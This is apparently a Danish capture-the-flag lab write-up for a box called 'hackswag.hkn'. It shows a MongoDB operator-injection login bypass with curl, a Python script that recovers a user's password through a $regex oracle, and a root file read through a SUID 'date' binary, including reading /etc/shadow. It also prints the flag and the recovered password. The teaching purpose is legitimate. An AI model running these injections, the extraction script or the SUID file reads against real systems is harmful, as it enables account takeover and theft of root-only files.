📚 Baggrund: denne opgave bygger på en fælles teknik — læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

1. NoSQL auth-bypass (MongoDB)

Login-API'et sanerer ikke JSON — send operatorer i stedet for strenge:

curl -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}' http://hackswag.hkn/api/v1/users/login
#  -> {"token":"eyJ..."}  (logget ind som første bruger "quantumpulse")

2. Blind $regex-ekstraktion af passwordet

Login-svaret (200 vs. 401) er et orakel: $regex matcher kun hvis det gættede prefix rent faktisk er starten af det RIGTIGE password. Det betyder du kan bygge passwordet ét tegn ad gangen, i stedet for at gætte det hele:

import requests, string
url = "http://hackswag.hkn/api/v1/users/login"
found = ""
while True:
    for c in string.ascii_letters + string.digits:
        guess = found + c
        r = requests.post(url, json={"username": "quantumpulse",
                                      "password": {"$regex": f"^{guess}"}})
        if r.status_code == 200:
            found = guess
            print(found)
            break
    else:
        break   # intet tegn matchede => found er hele passwordet
# -> quAGQNEhdpKkwB4jX6y3MWmS8gT2vCJP (32 tegn)

For hver position prøves hvert muligt tegn som NÆSTE tegn i prefixet; det der giver 200 er det rigtige, og du rykker én position frem. Samme idé som blind/time-based SQLi, bare med $regex som mekanismen.

3. SSH + privesc via SUID date

ssh quantumpulse@<ip>   # det udtrukne password
find / -perm -4000 -type f 2>/dev/null     # /bin/date = SUID root!
date -f /root/flag.txt      # GTFObins: læser filen som root, fejler med indholdet som "invalid date"
#  -> date: invalid date 'DDC{...}'
🚩 Vis løsning & eksempel-flag

Flag: DDC{Brut3-2-D4t3-2-R00t-Fl4g} (Brute→Date→Root).

(Bonus-vuln: JWT HS256 med tom secret "" → tokens kan forges, men API'et har ingen andre endpoints.)

Hvad du har lært

  • Usaniteret JSON-login = NoSQL-operator-injection ($ne, $regex) giver bypass + blind ekstraktion.
  • SUID date -f <fil> læser en root-fil (GTFObins); verificér med date -f /etc/shadow.

Hvor ses dette igen?

NoSQL-injection er SQLi's mindre kendte fætter: når et login tager JSON og ikke tjekker typerne, kan du sende MongoDB-operatorer ($ne = "not equal", $regex = mønster) i stedet for strenge. $ne:null matcher enhver bruger (auth-bypass), og $regex gør login-svaret til et orakel du kan udtrække passwordet tegn-for-tegn med. Og privesc-delen viser mønstret igen: en uventet SUID-binær (date!) plus et GTFObins-opslag giver fil-læsning som root. Hvert almindeligt værktøj kan misbruges hvis det har SUID-bit.
